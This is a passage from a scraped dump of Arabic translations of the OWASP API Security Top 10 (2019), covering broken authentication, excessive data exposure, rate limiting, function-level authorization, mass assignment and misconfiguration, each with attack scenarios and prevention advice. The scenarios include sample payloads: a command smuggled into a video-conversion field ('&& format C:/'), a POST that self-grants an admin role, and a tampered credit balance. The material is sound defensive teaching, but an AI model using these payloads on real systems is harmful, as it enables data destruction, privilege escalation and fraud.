خصائص API : قابلية الاستغلال **3**                                                                                                                                                                                                                                                                                                                | الانتشار **2** : قابلية الاكتشاف  **2**\t                                                                                                                                                                                                                                                                                                                                                                             | التأثر التقني **3** : تأثر الأعمال\t                                                                                                                                          |\n| المصادقة في واجهات برمجة التطبيقات API هي آلية معقدة وصعبة الفهم وقد يكون لدى مهندسي البرمجيات ومهندس امن المعلومات بعض المفاهيم الخاطئة حول حدود المصادقة وكيفية تنفيذها بشكل صحيح. بالإضافة إلى ذلك، تعد آلية المصادقة هدفًا سهلاً للمهاجمين ، نظرًا لأنها متاحة للجميع. تجعل هاتان النقطتان مكون المصادقة عرضة للعديد من عمليات الاستغلال. | هناك مسألتان فرعيتان: 1. محدودية آليات الحماية: يجب التعامل مع مصادر البيانات الخاصة بواجهات برمجة التطبيقات API والمسؤولة عن المصادقة بشكل مختلف عن المصادر الاخرى وتأمين طبقات إضافية من الحماية 2. سوء تنفيذ الآلية: يتم استخدام / تنفيذ الآلية دون مراعاة طرق الاستغلال الهجوم، أو أنها تبني بشكل غير صحيح (على سبيل المثال، قد لا تتناسب آلية المصادقة المصممة لأجهزة إنترنت الأشياء مع تطبيقات الويب).\t | يمكن للمهاجمين التحكم في حسابات المستخدمين الآخرين في النظام ، وقراءة بياناتهم الشخصية ، وتنفيذ إجراءات حساسة نيابة عنهم ، مثل المعاملات المالية وإرسال الرسائل الشخصية.\t |\n\n\n## هل أنا معرض لهذه الثغرة؟\n\nمصادر البيانات وآلية عملها والاصول الخاصة بها تحتاج إلى الحماية. حيث يجب معاملة \"نسيت كلمة المرور / إعادة تعيين كلمة المرور\" بنفس طريقة آليات المصادقة.\n    \n يكون API معرض للخطر اذا كان: \n * اذا كان لدى المهاجم قائمة متكاملة من اسماء المستخدمين وكلمات المرور تم الحصول عليها من اختراق او تسريب سابق\n * عند قيام المهاجم بهجمات كسر كلمة المرور وعدم استخدام آلية تحقق اخرى من المستخدم مثل Captcha.\n * كلمات المرور الضعيفة\n * ارسال المعلومات الحساسة او كلمات المرور من خلال URL.\n * عدم التحقق بالشكل الصحيح من عمليات المصادقة\n * الموافقة على استخدام المصادقة الغير موقعه او الموقع بشكل غير امن (\"alg\":\"none\") او عدم التحقق من تاريخ انتهاء المصادقة.\n * استخدام البيانات غير المشفرة في عمليات تسجيل الدخول او عدم حفظ الارقام السرية بشكل مشفر\n * استخدام مفاتيح تشفير ضعيفة.\n\n\n## امثلة على سيناريوهات الهجوم\n\n### السيناريو الاول\n\n في حال قام المهاجم بمحاولة الدخول بحسابات متعددة والتي تم الحصول عليها من تسريب للبيانات والتي يجب ان نقوم بوضع آلية للحماية من هجمات الدخول المتعدد بحسابات صحيح في وقت قصير ومحدود.\n\n### السيناريو الثاني\n\nفي حال قام المهاجم بمحاولة استعاد كلمة المرور من خلال ارسال طلب POST الى `/api/system/verification-codes` وذلك باستخدام اسم المستخدم فقط لتحقق من استعادة كلمة المرور. حيث يقوم التطبيق بإرسال رسالة نصية لهاتف الضحية مع آلية المصادقة الجديدة والمكونة من 6 ارقام. وحيث ان API لم يقم بوضع حد اعلى لطلبات المصادقة سيقوم المهاجم بتنفيذ جميع الاحتماليات وذلك بالتخمين على آلية المصادقة التي تم ارسالها الى هاتف الضحية وذلك بإرسال طلبات متعددة الى `/api/system/verification-codes/{smsToken}` لتحقق من مصدر البيانات في حال كان احد عمليات التخمين كانت صحيحة.\n    \n\n## كيف أمنع هذه الثغرة؟\n\n*  يجب ان تكون على دراية بجميع طرق و آليات المصادقة التي تتم من خلال ( الهواتف /تطبيقات الويب /المصادقة الواحدة/إلخ)\n*  قم بالتعاون مع مهندس التطبيقات لمعرفة ماهي الآليات المفقودة عند عمليات المصادقة \n*  اقرأ عن آليات المصادقة الخاصة بك. تأكد من أنك تفهم ماذا وكيف يتم استخدامها ويجب التنويه على ان برتوكول. OAuth ليس للمصادقة ، ولا مفاتيح واجهة رمجة التطبيقات API تستخدم للمصادقة.\n*  لا تقم بإختراع واعادة صناعة آليات مصادقة جديدة بل اتبع افضل الامتثالات والمعايير المتعارف عليها.\n* يجب التعامل مع مصادر البيانات لاستعادة كلمة المرور ونسيت كلمة المرور بشكل صحيح وذلك من خلال وضع ضوابط و آليات للحد من هجمات كسر كلمات المرور \n*  الاستفادة من وسائل الحماية كتعطيل الحساب بعد عدد محاولات غير ناجحة من عمليات تسجيل الدخول.\n*  قم باستخدام نموذج [OWASP Authentication Cheatsheet][3]\n*  في حال توفر التحقق الثنائي قم باستخدامه.\n*  قم بتنصيب التقنيات والطرق والاليات لرصد هجمات كسر كلمات المرور او محاولة استغلال الحسابات المسربة وقم بوضع آلية محددة لتقليل معدل المصادقة التي تستخدم  API.\n*  قم باستخدام آلية [ايقاف الحسابات][4] او Captcha وذلك لتقليل ومنع هجمات كسر كلمات المرور وقم بتنصيب تقنية عدم اتاحة استخدام كلمات المرور الضعيفة.\n*  يجب عدم استخدام مفاتيح الـ API لمصداقة المستخدم, بل تستخدم لتصديق التطبيقات والمشاريع مع الـ API.\n\n## المراجع\n\n### أواسب\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### المصادر الخارجية\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:16.406049"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa3-excessive-data-exposure.md", "content": "# API3:2019 خلل في استعراض البيانات\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                                  | نقاط الضعف\t                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | التأثير\t                                                                   |\n|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **3**\t                                                                                                                                                                                             | الانتشار **2** : قابلية الاكتشاف  **2**\t                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | التأثر التقني **2** : تأثر الأعمال                                            |\n| عادة ما يكون الكشف الغير مصرح به عن المعلومات او البيانات من خلال مراقبة حركة مرور البيانات او الطلبات وتحليل جميع الردود القادمة من API، وذلك للبحث عن أي بيانات حساسة يتم استعادتها وغير مصرح للمستخدم بالاطلاع عليها.\t | تعتمد واجهات التطبيقات API على ان تكون عوامل التصفية من جانب المستخدم حيث ان API عادة ما يتم استخدامه كمصدر للبيانات وفي بعض الأحيان يقوم المطورون بتنصيب API بشكل عام وافتراضي من غير التفكير في طرق التعامل مع البيانات الحساسة. حيث ان أدوات الفحص واكتشاف الثغرات الأمنية تستطيع رصد مثل تلك الثغرات والتي يصعب على API معرفة إذا كان هذا الطلب لأغراض الاستخدام الصحيح والقانوني او لأغراض الاطلاع وتسريب البيانات الحساسة. لذلك يجب ان نقوم بتصنيف البيانات الحساسة والفهم العميق لألية الطلب لها.\t | عادة ما يودي الكشف عن البيانات الى الاطلاع غير المصرح به او تسريب البيانات |\n\n   \n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\n<p dir='rtl' align='right'> تقوم واجهة برمجة التطبيقات  بإرجاع البيانات الحساسة إلى العميل حسب التصميم والطلب . عادة ما يتم تصفية هذه البيانات من جانب العميل قبل تقديمها للمستخدم. يمكن للمهاجم بسهولة اعتراض حركة المرور ورؤية البيانات الحساسة.\n\n\n## امثلة على سيناريوهات الهجوم: \n\n### السيناريو الاول: \n\n يقوم مطورين تطبيق الهواتف الذكية باستخدام `/api/articles/{articleId}/comments/{commentId}` كمصدر للبيانات وذلك بهدف عرض المقالات وبعض البيانات الوصفية الخاصة بها. وهنا يقوم المهاجم باعتراض حركة مرور البيانات الصادرة من هذه التطبيق وقراءة تلك البيانات الوصفية والتي قد تقوم بتسريب بعض البيانات الحساسة مثل بيانات كاتبين التعليقات وبعض بيانات تحديد الشخصية كـ PII، حيث ان مصدر البيانات تم تنصيبه بشكل افتراضي على هيئة (JSON) ومبنية على عامل التصفية لدى المستخدم.\n\n### السيناريو الثاني : \n يسمح نظام المراقبة المبني على أنظمة IOT او انترنت الأشياء لمدير النظام بانشاء حسابات  للمستخدمين بمختلف الصلاحيات، حيث قام مدير النظام بانشاء حساب لاحد حراس الامن والذي مصرح له بالاطلاع على بعض المباني و المواقع. وعندما قام الحارس باستخدام هاتفه للاطلاع على النظام يقوم نظام API باستدعاء لوحة أنظمة المراقبة المتاحة له من خلال /api/sites/111/cameras والتي تسمح له بمعرفة عدد الكاميرات المتاحة الاطلاع عليها من قبل حارس الامن حيث ان بعد عملية الطلب تم استقبال الرد من الخادم ببعض المعلومات التفصيلية على سبيل المثال `{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`  والتي لا تظهر على لوحة المراقبة الخاصة بالحارس ( الواجهة الرسومية ) بل في تفاصيل الطلب فقط والتي تحتوي على جميع الكاميرات والمباني.\n\n### كيف أمنع هذه الثغرة؟ \n\n*  لا تثق ابداُ في عوامل التصفية لدى العميل او المستخدم في حال كانت هناك بيانات حساسة\n*  دائماً قم بمراجعة الطلبات والردود من مصادر البيانات للتاكد من ان جميع البيانات المتوفرة هي بيانات غير حساسة ومنطقية\n*  يجب على مهندسي التطبيقات الداخلية و مسؤولي الانظمة السؤال بشكل دائم من هم مستخدمي تلك البيانات قبل البدء بتنصيب API جديدة على النظام.\n*  تجنب استخدام الإعدادات العامة مثل to_json() و To_string() واستبدلها بخصائص معينة ومحددة مطلوب استرجاعها. \n*   قم بتصنيف المعلومات الحساسة و المعلومات المرتبطة بالهوية الشخصية (PII) التي يخزنها تطبيقك ويعمل معها ، مع مراجعة جميع الطلبات الخاصة بواجهة برمجة التطبيقاتAPI   والردود المتوقعة منها ومعرفة الاشكاليات الامنية التي قد يتم رصدها بتلك الردود  \n*  قم باستخدام آليات التحقق مثل `(schema-based response validation mechanism)` وحدد ماهي البيانات التي يتم ارجاعها مع الطلبات بما في ذلك الاخطاء والمعلومات المتوفرة بها.\n\n\n### المراجع : \n### المصادر الخارجية :\n* [CWE-213: Intentional Information Exposure][1]\n\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:16.515932"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 ضعف في البنية التحتية و حد محاولات الطلبات\n\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                     | نقاط الضعف\t                                                                                                                   | التأثير\t                                                                                                  |\n|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **2**\t                                                                                                                                                                | الانتشار **3** : قابلية الاكتشاف  **3**\t                                                                                             | التأثر التقني **2** : تأثر الأعمال                                                                           |\n| ان عملية الاختراق في بعض الاحيان عملية غير معقدة حيث لا يستلزم الا طلب بسيط للـAPI ومن غير عملية مصادقة كذلك وقد يتم ارسال طلب من خلال جهاز واحد او أجهزة متعددة او أجهزة الخدمات السحابية.\t | من الاخطاء الشائعة والمنتشرة هو عدم وضع معدل لطلبات او لم يتم اختيار الموصفات المناسبة عند تنصيب واجهات برمجة التطبيقات API.\t | قد يؤدي الاستغلال الى هجمات حجب الخدمة DOS مما يجعل واجهة برمجة التطبيقات API غير مستجيبة او خارج الخدمة. |\n\n\n  \n\n### هل أنا معرض لهذه الثغرة؟\n\nتستهلك واجهة برمجة التطبيقات API المصادر والأصول من شبكات ووحدات المعالجة وكذلك وسائط التخزين حيث يعتمد بشكل كبير مقدرة تعامل البنية التحتية حسب طلبات ومدخلات المستخدم لمصادر البيانات. وضع في الاعتبار ان طلبات واجهة برمجة التطبيقات API التي تفوق قدرات البنية التحتية تعرضها للخطر بشكل كبير اذا لم يتم تداركها و وضع معدل لمستوى ومحتوى تلك الطلبات ومنها:\n\n*  مدة حياة الطلب\n*  اعلى حد من استخدام الذاكرة العشوائية لكل طلب\n* عدد الملفات وطرق وصفها وحفظها وعرضها \n*  عدد العمليات\n* عدد وحجم البياتات عند رفعها\n* عدد الطلبات لكل مستخدم \n* عدد الصفحات التي يتم عرضها في كل طلب و استجابة لصفحة الواحدة.\n\n\n## امثلة على سيناريوهات الهجوم: \n\n### السيناريو الاول:\n\nيقوم المهاجم برفع صورة كبيرة الحجم والابعاد عن طريق طلب POST  الى `/api/v1/images` وعند اكتمال عملية الرفع يقوم الخادم باستعراض الصور المتبقية على هيئة ايقونات مصغرة بسبب الابعاد والحجم الذي قد يستغرق الموارد وقد يؤدي الى عدم واجهة برمجة التطبيقات API.\n    \n## السيناريو الثاني :\n\n يقوم التطبيق بعرض المستخدمين بحد اقصى 200 مستخدم في كل صفحة من خلال ارسال طلب الى `/api/users?page=1&size=200`، مما قد يمكن المهاجم من تغير القيمة الى 200000 في عدد أسماء المستخدمين المعروضة في صفحة واحد مما يسبب في حدوث مشكلات في أداة قاعدة البيانات وفي الوقت نفسة تصبح واجهة برمجة التطبيقات غير متاحة وغير قادرة على التعامل مع الطلبات الأخرى ( هجمة حجب الخدمة DOS ) ويمكن استخدام نفس السيناريو لاستعراض الأخطاء او لاستغلال بعض عمليات Integer Overflow  او Buffer Overflow.\n\n### كيف أمنع هذه الثغرة؟\n\n* استخدم  منصة Docker مما يجعل الامر في غاية البساطة في التحكم في الذاكرة العشوائية او وحدات المعالجة و التخزين \n* ضع معدل محدد لعدد الطلبات التي يقوم بطلبها المستخدم خلال اطار زمني معين\n* اخطار المستخدم عند تجازو المعدل المحدد في الاطار الزمني المعين \n* قم باضافة بعض آليات التحقق من جانب الخادم في عمليات الطلبات او حتى التحقق من النصوص او العمليات او الطلبات وتحديداً في تلك العمليات التي تتطلب عدد من السجلات يتم استرجاعها من العميل.\n* تحديد وفرض الحد الاعلى لحجم وابعاد الطلبات المرفوعة مثل الحد الاقصى لعدد الجمل او الحد الاعلى لعدد الاسطر\n\n### المراجع : \n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### المصادر الخارجية : \n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:16.622438"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 ضعف في التحقق من الهوية وادارة الصلاحيات و التفويض\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | نقاط الضعف\t                                                                                                                                                                                                                                                                        | التأثير\t                                                                                                                           |\n|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **3**\t                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | الانتشار **2** : قابلية الاكتشاف  **1**\t                                                                                                                                                                                                                                                  | التأثر التقني **2** : تأثر الأعمال                                                                                                    |\n| ان عملية استغلال هذه الثغرة بسيط نسيباً بحيث يستطيع المهاجم ارسال طلب غير ضار من خلال واجهة برمجة التطبيقات API الى مصادر البيانات التي من الغير مصرح له بالاطلاع عليها. وقد تكون تلك المصادر متاحة للمسخدمين المجهولين او المستخدم الذي لا يملك صلاحيات عالية. وحيث ان من السهل اكتشاف مثل تلك الثغرات من خلال معرفة سلوك الطلبات والياتها المستخدمة وطرق طلبها والردود المتوقعة من كل طلب وقد يتم استغلالها ببساطة من خلال استبدال طلب GET بـ PUT او تغير صلاحيات المستخدم من \"User \" الى \"Admin\".\t | عادة ما يتم تحديد صلاحيات الوصول للموارد من خلال الاعدادات. وفي بعض الأحيان على مستوى الاكواد البرمجية، ان عملية تنصيب طرق التحقق بالشكل الصحيح قد تكون في بعض الأحيان عملية معقدة. حيث ان معظم التطبيقات الحديثة تحتوي على مختلف الصلاحيات والمجموعات بتسلسل هرمي معقد بعض الشئ.\t | بعض آليات العمل قد تسمح للمهاجم في الاستفادة والوصول والاطلاع الغير مصرح به، او حصوله على صلاحيات إدارية تمكنه من التحكم والسيطرة. |\n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\nأفضل طريقة للعثور على مشكلات وخلل تفويض مستوى الصلاحيات والمصادقة هي إجراء تحليل عميق لآلية التفويض ، مع مراعاة التسلسل الهرمي للمستخدم ، والأدوار أو المجموعات المختلفة في التطبيق ، وطرح الأسئلة التالية:\n    \n* هل يستطيع المستخدم العادي الوصول الى مصادر صلاحيات المدراء ؟\n* هل يستطيع المستخدم تعديل او تعيين او مسح مصادر البيانات عند تغير طريقة الطلب للبروتوكول على سبيل المثال من GET الى DELETE ؟\n*  هل يستطيع المستخدم في مجموعة أ من الوصول الى مصادر المجموعة ب من خلال تخمين مصدر تلك المجموعة `/api/v1/users/export_all` \n\n* لا تقم بوضع وتقسيم الصلاحيات ما بين الصلاحيات المعتادة والصلاحيات الادارية من خلال مسار URL.\n* و من الشائع لدى المطورين عرض مصادر البيانات الإدارية ضمن مسار محدد مثل API/Admin ومن الشائع كذلك استخدام مصادر واحدة للمستخدم العادي وكذلك للمدراء مثل api/users.\n\n## امثلة على سيناريوهات الهجوم: \n\n### السيناريو الاول: \n\n يقوم التطبيق فقط بالسماح للمستخدمين المدعوين بالتسجيل، حيث يقوم التطبيق بطلب API الخاص من خلال طلب GET  على سبيل المثال المسار التالي ` /api/invites/{invite_guid}` ويأتي الرد من الخادم والذي يحتوي على ملف JSON مع تفاصيل الدعوة، وكذلك تفاصيل المستخدمين و الصلاحيات والبريد الالكتروني.\n\n يقوم المهاجم بتكرار الطلبات ومحاولة التلاعب والتعديل في طريقة الطلب من مصدر البيانات  من GET  الى POST  مع المسار التالي `/api/invites/new`  حيث ان هذا المسار مسموح بالوصول له فقط لأصحاب الصلاحيات الإدارية بواسطة صفحة الإدارة والتي من الواضح عدم تطبيق مستوى المصادقة والتفويض على مستوى الصلاحية.\n\n المهاجم قام باستغلال الخطأ من خلال ارسال طلب دعوة لنفسه ومن ثم قام بإنشاء حساب بصلاحيات مرتفعة.\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### السيناريو الثاني :\n\n تحتوي واجهة برمجة التطبيقات API على صلاحيات وصول الى مصادر البيانات والمحددة فقط لمدراء النظام من خلال الطلب باستخدام GET  للمسار التالي `/api/admin/v1/users/all` حيث ان مصدر البيانات عند ارجاع البيانات لا تقوم بالتأكد من صلاحيات من قام بطلبها او الصلاحيات المخولة له مما يمكن المهاجم من تخمين المسارات الخاصة بمصادر البيانات لاستعراض بيانات حساسة غير مصرح له بالوصول لها.\n\n### كيف أمنع هذه الثغرة؟\n\nيجب أن يحتوي التطبيق الخاص بك على وحدة تفويض متسقة وسهلة التحليل يتم استدعاؤها من خلال جميع وظائف تطبيقك.  في كثير من الأحيان يتم توفير هذه الحماية بواسطة مكون أو أكثر خارج الاكواد البرمجية الخاصة بالتطبيق.\n\n*  يجب منع الوصول لجميع المصادر بشكل افتراضي وبعد ذلك يتم السماح والاستثناء للمصادر لكل مصدر على حدة ولكل صلاحية بشكل مستقل.\n*  قم بمراجعة صلاحيات المصادقة والتفويض الخاص بالآليات العمل، مع مراعاة منطق التسلسل الهرمي وصلاحيات المجموعات والصلاحيات على مستوى المستخدمين.\n* التأكد من ان صلاحيات التحكم الادارية مبنية بشكل سليم ومرتبطة بصلاحيات المصادقة والتفويض لكل مجموعة او مستخدم او صلاحية.\n* التأكد من ان الاوامر والصلاحيات الادارية مبنية بشكل محوكم وهناك وحدة تحكم تقوم بفحص الصلاحيات والتفويض لكل مستخدم بناء على المجموعة التي تم تعيينه بداخلها.\n\n\n\n## المراجع :  \n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n### المصادر الخارجية : \n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:16.738077"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa6-mass-assignment.md", "content": "# API6:2019 التعيين الجماعي\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                                      | نقاط الضعف\t                                                                                                                                                                                                                                                                        | التأثير\t                                                                                   |\n|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **2**\t                                                                                                                                                                                                | الانتشار **2** : قابلية الاكتشاف  **2**\t                                                                                                                                                                                                                                                    | التأثر التقني **2** : تأثر الأعمال                                                            |\n| يتطلب الاستغلال عادةً فهم منطق آلية العمل وعلاقة الكائنات ببعضها وهيكل واجهة برمجة التطبيقات API. حيث يعد استغلال التعيين الجماعي أسهل في واجهات برمجة التطبيقاتAPI ، حيث أنها تفصح عن أجزاء من بنية التطبيق ومسميات خصائصه.\t | تشجع الأطر الحديثة في البرمجة المطورين على استخدام الدوال التي تربط بشكل الأوتوماتيكي المدخلات من المستخدم مع المتغيرات البرمجية ومكونات التطبيق الداخلية. يستطيع المهاجم استخدام هذه الخاصية لتحديث أو تغيير بعض الخصائص الحساسة لمكونات التطبيق التي لم ينوى المطور السماح بها.\t | قد يؤدي هذا الاستغلال إلى تصعيد الصلاحيات والتلاعب بالبيانات وتجاوز آليات الأمان وغير ذلك. |\n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\nتحتوي بعض التطبيقات الحديثة على العديد من الخصائص وبعض تلك الخصائص يجب تحديثها بواسطة المستخدمين على سبيل المثال `user.first_name`  أو  `user.address` وبعض الخصائص لا يسمح للمستخدمين بتعديلها على سبيل المثال `user.is_vip`.\n\nتكون واجهة برمجة التطبيقات API ومصادر البيانات عرضة للاختراق إذا تم استخدام مدخلات المستخدم ككائنات داخلية، من دون مراعاة لمستوى حساسية وخطورة تلك الكائنات. وها قد يسمح للمهاجم بتحديث خصائص الكائنات التي لا يجب أو غير مصرح له بالوصول إليها.\n\n### أمثلة على بعض الخصائص الحساسة:\n\n*  التعديل في بعض الخواص: مثل `user.is_admin`, `user.is_vip` يجب أن تكون فقط لأصحاب الصلاحيات الإدارية.\n* الخواص المعتدة على العمليات: مثل `user.cash` يجب أن يتم التحقق داخلياً بعد التأكد من عملية الدفع.\n* الخواص الداخلية: على سبيل المثال `article.created_time` يجب أن يكون داخلياً وبواسطة التطبيق فقط.\n\n\n## أمثلة على سيناريوهات الهجوم:\n\n### السيناريو الأول\n\nتطبيق مخصص لرحلات يوفر للمستخدم خيار تعديل البيانات والمعلومات الأساسية للملف الشخصي من خلال إرسال طلب بواسطة برمجة واجهة التطبيقات API التالي `/api/v1/users/me` بواسطة طلب PUT باستخدامJSON بالشكل التالي:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\nيتضمن الطلب GET للمسار التالي `/api/v1/users/me` مع خاصية معرفة الرصيد الائتمانية:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nحيث قام المهاجم باعتراض الطلب وتغيره إلى التالي:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nونظراً لان مصادر البيانات مصابة بخلل في التعيين والتعديل قام المهاجم بالحصول على مبالغ مالية من دون دفع أي مبلغ حقيقي.\n\n### السيناريو الثاني:\n\nتتيح منصة مشاركة ملفات الفيديو تحميل ورفع وتنزيل الملفات بتنسيقات وامتدادات مختلفة. حيث لاحظ المهاجم أن واجهة برمجة التطبيقات والتي تستطيع الوصول لها من خلال طلب GET على المسار التالي `/api/v1/videos/{video_id}/meta_data` انه يستطيع الحصول على ملف JSON يحتوي على خصائص ملفات الفيديو. على سبيل المثال `mp4_conversion_params\":\"-v codec h264` مما يوضح أن التطبيق يستخدم أوامر Shell لعملية تحويل الفيديو.\n\nوجد المهاجم احد مصادر البيانات مصابة بالثغرة التي تسمح له بالتعديل والتعين فقام بإرسال تعليمات برمجية ضارة باستخدام واجهة برمجة التطبيقات API مع طلب POST من خلال المسار التالي `/api/v1/videos/new` حيث قام بتعين القيمة التالية مع العملية `mp4_conversion_params\":\"-v codec h264 && format C:/` والتي سمحت للمهاجم بتنفيذ التعليمات من خلال أوامر Shell بعد إرساله لطلب تنزيل ملف الفيديو.\n\n## كيف أمنع هذه الثغرة؟\n\n*  تجنب بقدر ما يمكن استخدام الوظائف التي تتطلب من المستخدم إدخال بعض المتغيرات في الاكواد الداخلية.\n*  أضف الخصائص التي يتوجب على المستخدم إدخالها إلى قائمة بيضاء محددة.\n*  استخدام الطرق والأساليب التي تمنع المستخدم من الاطلاع أو الوصول غير المصرح به إلى المصادر أو الخصائص.\n*  إذا كان من الممكن فرض سياسة استخدام مدخلات محددة في البيانات عند عمليات الرفع أو التنزيل.\n\n\n<h4 dir='rtl' align='right'>المراجع:</h4>\n<h4 dir='rtl' align='right'>المصادر الخارجية:</h4>\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:16.852108"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa7-security-misconfiguration.md", "content": "# API7:2019 الاعداد الخاطئ\n\n| عوامل التهديد/ الاستغلال     | نقاط الضعف\t                                                                                                                                                                                                                                                                                            | التأثير\t                                                                          |\n|-------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **3**\t                                                                                                                             | الانتشار **3** : قابلية الاكتشاف  **3**\t                                                                                                                                                                                                                                                                      | التأثر التقني **2** : تأثر الأعمال                                                   |\n| يحاول المهاجمون غالباً البحث عن الثغرات الأمنية على مستوى الأنظمة او اليات العمل اول على مصادر بيانات غير محمية وذلك بغاية الوصول الغير مصرح به للمعلومات.\t | يمكن ان يحدث الاعداد الخاطئ في أي مستوى من مستويات واجهة برمجة التطبيقات API، ابتداءًا من مستوى الشبكة الى مستوى التطبيقات، حيث تتوفر الأدوات للقيام بالفحص واكتشاف الأخطاء بشكل آلي وذلك بهدف البحث عن مواطن الإعدادات الخاطئة او الخدمات الفعالة والغير ضرورية او الخيارات القديمة والمصابة بثغرات.\t | قد يؤدي عملية الإعدادات الخاطئة الى تسريب البيانات وكذلك اختراق الأنظمة والخوادم. |\n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\n### قد يكون واجهة التطبيقات API معرضة لثغرات في حال :\n\n* اذا لم يكن هناك أي آلية متبعة لعملية تعزيز حماية النظام في جميع مراحله او اذا كان هناك تهيئة غير صحيحة على الخدمات السحابية.\n* اذا لم يكن هناك آلية لسد الثغرات الأمنية او في حال كانت الأنظمة المستخدمة غير محدثة او خارجة عن الخدمة.\n* 